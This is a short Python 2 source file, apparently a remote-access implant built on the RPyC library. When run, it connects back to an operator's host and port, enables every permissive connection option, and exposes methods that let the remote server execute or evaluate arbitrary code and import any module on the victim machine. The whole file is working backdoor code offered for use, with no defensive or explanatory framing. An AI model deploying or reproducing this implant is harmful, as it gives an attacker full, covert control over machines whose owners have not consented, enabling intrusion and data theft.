import sys

from rpyc.core.service import Service, ModuleNamespace
from rpyc.utils.factory import connect
from rpyc.lib.compat import execute

class ReverseSlave(Service):
    """ RPyC reverse connection service. """
   
    __slots__ = ["exposed_namespace"]

    #http://rpyc.readthedocs.io/en/latest/_modules/rpyc/utils/classic.html
    #http://nullege.com/codes/show/src@r@p@rpyc-op-3.2.1-openproximity@rpyc@core@service.py/148/rpyc.lib.compat.execute
    def on_connect(self):
        """ Set these attributes once implant connects to server. """
        
        try:
            self.exposed_namespace = {}
            self._conn._config.update(dict(
                allow_all_attrs = True,
                allow_public_attrs = True,
                allow_pickle = True,
                allow_getattr = True,
                allow_setattr = True,
                allow_delattr = True,
                import_custom_exceptions = False,
                propagate_SystemExit_locally = True,
                propagate_KeyboardInterrupt_locally = True,
                instantiate_custom_exceptions = True,
                instantiate_oldstyle_exceptions = True,
            ))
            self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
        except Exception as e:
            print e

    def on_disconnect(self):
        sys.exit()

    def exposed_exit(self):
        raise KeyboardInterrupt

    def exposed_execute(self, text):
        """ Execute code from server. """
        execute(text, self.exposed_namespace)

    def exposed_eval(self, text):
        """ Eval code from server. """
        return eval(text, self.exposed_namespace)
    
    def exposed_getmodule(self, name):
        """ Imports an arbitrary module. """
        return __import__(name, None, None, "*")

    def exposed_getconn(self):
        """ Return local connection instance to server. """
        return self._conn

def main():
    if len(sys.argv) == 2:
        addr, port = sys.argv[1].split(":") 

        try:
            conn = connect(addr, port, ReverseSlave)
            while True:
               conn.serve_all()
        except KeyboardInterrupt:
            pass 
        except Exception as e:
            print e
    else:
        print "usage: python implant.py 127.0.0.1:8080"

if __name__ == "__main__":
    main()
